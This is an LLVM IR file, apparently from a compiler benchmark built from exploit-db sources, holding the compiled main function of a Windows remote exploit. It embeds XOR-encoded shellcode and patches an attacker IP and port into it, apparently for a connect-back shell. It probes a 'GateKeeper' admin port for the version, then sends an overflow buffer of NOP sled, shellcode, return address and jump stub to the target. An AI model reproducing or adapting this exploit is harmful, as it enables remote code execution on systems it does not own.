; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_155.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_155.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SIZE = common dso_local global i32 0, align 4
@__const.main.shellc0de = private unnamed_addr constant [327 x i8] c"\EB\02\EB\05\E8\F9\FF\FF\FF[\80\C3\103\C9f\B93\01\803\95C\E2\FA\1Ea\C0\C3\F14\A5\95\95\95\1E\D5\99\1E\E5\898\1E\FD\9D~\95\1EP\CB\C8\1C\93j\A3\FD\1B\DB\9By}8\95\95\95\FD\A6\A7\95\95\FD\E2\E6\A7\CA\C1jE\1Em\C2\FDL\9C`8}\06\95\95\95\A6\\\C4\C4\C4\C4\D4\C4\D4\C4jE\1C\D3\B1\C2\FDyl?\F5}\EC\95\95\95\FD\D4\D4\D4\D4\FD\D7\D7\D7\D7\1EY\FF\85\C4j\E3\B1jE\FD\F6\F8\F1\95\1C\F3\A5j\A3\FD\E7k&\83}\C4\95\95\95\1C\D3\8B\16y\C1\18\A9\B1\A6U\A6\\\16T\80>whS\D1\B1\85\D1k\D1\B1\A8k\D1\B1\A9\1E\D3\B1\1C\D1\B1\DD\1C\D1\B1\D9\1C\D1\B1\C5\18\D1\B1\85\C1\C5\C4\C4\C4\FF\94\C4\C4j\E3\A5\C4j\C3\8Bj\A3\FDz[u\F5}\97\95\95\95jE\C6\C0\C3\C2\1E\F9\B1\8D\1E\D0\A9\1E\C1\90\ED\96@\1E\DF\8D\1E\CF\B5\96Hv\A7\DC\1E\A1\1E\96`\A6ji\A6U9\AFQ\E1\92TZ\98\96m~g\AE\E9\B1\81\E0t\1E\CF\B1\96H\F3\1E\99\DE\1E\CF\89\96H\1E\91\1E\96P~\97\A6U\1E@\CA\CB\C8\CEW\91\95\00", align 16
@.str = private unnamed_addr constant [44 x i8] c"error: <port> must be between 1 and 65535\0D\0A\00", align 1
@HOP = common dso_local global i8 0, align 1
@POP = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"[i] error: unabled to find ip/port sequence in shellc0de\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"[i] error: unable to load winsock\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [55 x i8] c"[-] Getting version through administration interface\0D\0A\00", align 1
@ADMIN_PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [75 x i8] c"[i] warning: couldn't connect to admin int to get version, trying anyway\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"I'm a script kiddie\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"GateKeeper@\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"[i] waring: version not found, trying anyway\0D\0A\00", align 1
@VERSION = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [27 x i8] c"[i] error: wrong version\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"[i] %-44s ...OK\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"[i] Starting to exploit\0D\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [30 x i8] c"[i] Preparing magic %-28s ...\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"packet\00", align 1
@RET_POS = common dso_local global i32 0, align 4
@RET_ADDR = common dso_local global i64 0, align 8
@.str.14 = private unnamed_addr constant [6 x i8] c"\E9\ED\F6\FF\FF\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Done\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [53 x i8] c"[i] Sending magic packet                         ...\00", align 1
@REQ = common dso_local global i8* null, align 8
@REQ2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca [327 x i8], align 16
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @SIZE, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %9, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %10, align 8
  %21 = bitcast [327 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %21, i8* align 16 getelementptr inbounds ([327 x i8], [327 x i8]* @__const.main.shellc0de, i32 0, i32 0), i64 327, i1 false)
  %22 = call i32 (...) @banner()
  %23 = load i32, i32* %4, align 4
  %24 = icmp ne i32 %23, 4
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @syntax(i8* %28)
  br label %30

30:                                               ; preds = %25, %2
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @inet_addr(i8* %33)
  %35 = xor i32 %34, -1785358955
  %36 = zext i32 %35 to i64
  store i64 %36, i64* %12, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 3
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @atoi(i8* %39)
  store i64 %40, i64* %13, align 8
  %41 = load i64, i64* %13, align 8
  %42 = icmp ule i64 %41, 0
  br i1 %42, label %46, label %43

43:                                               ; preds = %30
  %44 = load i64, i64* %13, align 8
  %45 = icmp ugt i64 %44, 65535
  br i1 %45, label %46, label %48

46:                                               ; preds = %43, %30
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

48:                                               ; preds = %43
  %49 = load i64, i64* %13, align 8
  %50 = trunc i64 %49 to i16
  %51 = call i64 @htons(i16 zeroext %50)
  store i64 %51, i64* %13, align 8
  %52 = load i64, i64* %13, align 8
  %53 = shl i64 %52, 16
  store i64 %53, i64* %13, align 8
  %54 = load i64, i64* %13, align 8
  %55 = add i64 %54, 2
  store i64 %55, i64* %13, align 8
  %56 = load i64, i64* %13, align 8
  %57 = xor i64 %56, 2509608341
  store i64 %57, i64* %13, align 8
  store i32 0, i32* %14, align 4
  br label %58

58:                                               ; preds = %153, %48
  %59 = load i32, i32* %14, align 4
  %60 = zext i32 %59 to i64
  %61 = icmp ult i64 %60, 327
  br i1 %61, label %62, label %156

62:                                               ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = load i8, i8* @HOP, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %67, %69
  br i1 %70, label %71, label %107

71:                                               ; preds = %62
  %72 = load i32, i32* %14, align 4
  %73 = add i32 %72, 1
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %74
  %76 = load i8, i8* %75, align 1
  %77 = zext i8 %76 to i32
  %78 = load i8, i8* @HOP, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %77, %79
  br i1 %80, label %81, label %107

81:                                               ; preds = %71
  %82 = load i32, i32* %14, align 4
  %83 = add i32 %82, 2
  %84 = zext i32 %83 to i64
  %85 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = load i8, i8* @HOP, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %87, %89
  br i1 %90, label %91, label %106

91:                                               ; preds = %81
  %92 = load i32, i32* %14, align 4
  %93 = add i32 %92, 3
  %94 = zext i32 %93 to i64
  %95 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = load i8, i8* @HOP, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %97, %99
  br i1 %100, label %101, label %106

101:                                              ; preds = %91
  %102 = load i32, i32* %14, align 4
  %103 = zext i32 %102 to i64
  %104 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %103
  %105 = call i32 (i8*, ...) @memcpy(i8* %104, i64* %12, i32 4)
  store i64 0, i64* %12, align 8
  br label %106

106:                                              ; preds = %101, %91, %81
  br label %107

107:                                              ; preds = %106, %71, %62
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = load i8, i8* @POP, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %112, %114
  br i1 %115, label %116, label %152

116:                                              ; preds = %107
  %117 = load i32, i32* %14, align 4
  %118 = add i32 %117, 1
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* @POP, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %122, %124
  br i1 %125, label %126, label %152

126:                                              ; preds = %116
  %127 = load i32, i32* %14, align 4
  %128 = add i32 %127, 2
  %129 = zext i32 %128 to i64
  %130 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = load i8, i8* @POP, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %132, %134
  br i1 %135, label %136, label %151

136:                                              ; preds = %126
  %137 = load i32, i32* %14, align 4
  %138 = add i32 %137, 3
  %139 = zext i32 %138 to i64
  %140 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %139
  %141 = load i8, i8* %140, align 1
  %142 = zext i8 %141 to i32
  %143 = load i8, i8* @POP, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %142, %144
  br i1 %145, label %146, label %151

146:                                              ; preds = %136
  %147 = load i32, i32* %14, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 %148
  %150 = call i32 (i8*, ...) @memcpy(i8* %149, i64* %13, i32 4)
  store i64 0, i64* %13, align 8
  br label %151

151:                                              ; preds = %146, %136, %126
  br label %152

152:                                              ; preds = %151, %116, %107
  br label %153

153:                                              ; preds = %152
  %154 = load i32, i32* %14, align 4
  %155 = add i32 %154, 1
  store i32 %155, i32* %14, align 4
  br label %58

156:                                              ; preds = %58
  %157 = load i64, i64* %12, align 8
  %158 = icmp ne i64 %157, 0
  br i1 %158, label %162, label %159

159:                                              ; preds = %156
  %160 = load i64, i64* %13, align 8
  %161 = icmp ne i64 %160, 0
  br i1 %161, label %162, label %164

162:                                              ; preds = %159, %156
  %163 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

164:                                              ; preds = %159
  %165 = call i64 @WSAStartup(i32 257, i32* %6)
  %166 = icmp ne i64 %165, 0
  br i1 %166, label %167, label %169

167:                                              ; preds = %164
  %168 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

169:                                              ; preds = %164
  %170 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.3, i64 0, i64 0))
  %171 = load i8**, i8*** %5, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 1
  %173 = load i8*, i8** %172, align 8
  %174 = load i32, i32* @ADMIN_PORT, align 4
  %175 = call i32 @cnx(i8* %173, i32 %174)
  store i32 %175, i32* %7, align 4
  %176 = load i32, i32* %7, align 4
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %180, label %178

178:                                              ; preds = %169
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.4, i64 0, i64 0))
  br label %213

180:                                              ; preds = %169
  %181 = load i32, i32* %7, align 4
  %182 = call i32 @send(i32 %181, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0), i32 21, i32 0)
  %183 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %184 = call i32 @memset(i8* %183, i32 0, i32 1024)
  %185 = load i32, i32* %7, align 4
  %186 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %187 = call i32 @recv(i32 %185, i8* %186, i32 1024, i32 0)
  %188 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %189 = call i32 @memset(i8* %188, i32 0, i32 1024)
  %190 = load i32, i32* %7, align 4
  %191 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %192 = call i32 @recv(i32 %190, i8* %191, i32 1024, i32 0)
  %193 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %194 = call i8* @strstr(i8* %193, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0))
  store i8* %194, i8** %11, align 8
  %195 = load i8*, i8** %11, align 8
  %196 = icmp ne i8* %195, null
  br i1 %196, label %199, label %197

197:                                              ; preds = %180
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  br label %212

199:                                              ; preds = %180
  %200 = load i8*, i8** %11, align 8
  %201 = getelementptr inbounds i8, i8* %200, i64 11
  store i8* %201, i8** %11, align 8
  %202 = load i8*, i8** %11, align 8
  %203 = load i8*, i8** @VERSION, align 8
  %204 = load i8*, i8** @VERSION, align 8
  %205 = call i32 @strlen(i8* %204)
  %206 = call i64 @strncmp(i8* %202, i8* %203, i32 %205)
  %207 = icmp ne i64 %206, 0
  br i1 %207, label %208, label %210

208:                                              ; preds = %199
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

210:                                              ; preds = %199
  %211 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  br label %212

212:                                              ; preds = %210, %197
  br label %213

213:                                              ; preds = %212, %178
  %214 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i64 0, i64 0))
  %215 = load i8**, i8*** %5, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 1
  %217 = load i8*, i8** %216, align 8
  %218 = load i32, i32* @PORT, align 4
  %219 = call i32 @cnx(i8* %217, i32 %218)
  store i32 %219, i32* %7, align 4
  %220 = load i32, i32* %7, align 4
  %221 = icmp ne i32 %220, 0
  br i1 %221, label %223, label %222

222:                                              ; preds = %213
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

223:                                              ; preds = %213
  %224 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0))
  %225 = load i32, i32* @SIZE, align 4
  %226 = call i32 @memset(i8* %20, i32 144, i32 %225)
  %227 = load i32, i32* @RET_POS, align 4
  %228 = sub nsw i32 %227, 2220
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i8, i8* %20, i64 %229
  %231 = getelementptr inbounds [327 x i8], [327 x i8]* %15, i64 0, i64 0
  %232 = call i32 (i8*, ...) @memcpy(i8* %230, i8* %231, i64 327)
  %233 = load i64, i64* @RET_ADDR, align 8
  %234 = load i32, i32* @RET_POS, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds i8, i8* %20, i64 %235
  %237 = bitcast i8* %236 to i64*
  store i64 %233, i64* %237, align 1
  %238 = load i32, i32* @RET_POS, align 4
  %239 = add nsw i32 %238, 12
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds i8, i8* %20, i64 %240
  %242 = call i32 (i8*, ...) @memcpy(i8* %241, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i32 5)
  %243 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0))
  %244 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.16, i64 0, i64 0))
  %245 = load i32, i32* %7, align 4
  %246 = load i8*, i8** @REQ, align 8
  %247 = load i8*, i8** @REQ, align 8
  %248 = call i32 @strlen(i8* %247)
  %249 = call i32 @send(i32 %245, i8* %246, i32 %248, i32 0)
  %250 = load i32, i32* %7, align 4
  %251 = trunc i64 %18 to i32
  %252 = call i32 @send(i32 %250, i8* %20, i32 %251, i32 0)
  %253 = load i32, i32* %7, align 4
  %254 = load i8*, i8** @REQ2, align 8
  %255 = load i8*, i8** @REQ2, align 8
  %256 = call i32 @strlen(i8* %255)
  %257 = call i32 @send(i32 %253, i8* %254, i32 %256, i32 0)
  %258 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i64 0, i64 0))
  %259 = load i32, i32* %7, align 4
  %260 = call i32 @closesocket(i32 %259)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %16, align 4
  br label %261

261:                                              ; preds = %223, %222, %208, %167, %162, %46
  %262 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %262)
  %263 = load i32, i32* %3, align 4
  ret i32 %263
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @banner(...) #3

declare dso_local i32 @syntax(i8*) #3

declare dso_local i32 @inet_addr(i8*) #3

declare dso_local i64 @atoi(i8*) #3

declare dso_local i32 @printf(i8*, ...) #3

declare dso_local i64 @htons(i16 zeroext) #3

declare dso_local i32 @memcpy(i8*, ...) #3

declare dso_local i64 @WSAStartup(i32, i32*) #3

declare dso_local i32 @cnx(i8*, i32) #3

declare dso_local i32 @send(i32, i8*, i32, i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @recv(i32, i8*, i32, i32) #3

declare dso_local i8* @strstr(i8*, i8*) #3

declare dso_local i64 @strncmp(i8*, i8*, i32) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @closesocket(i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
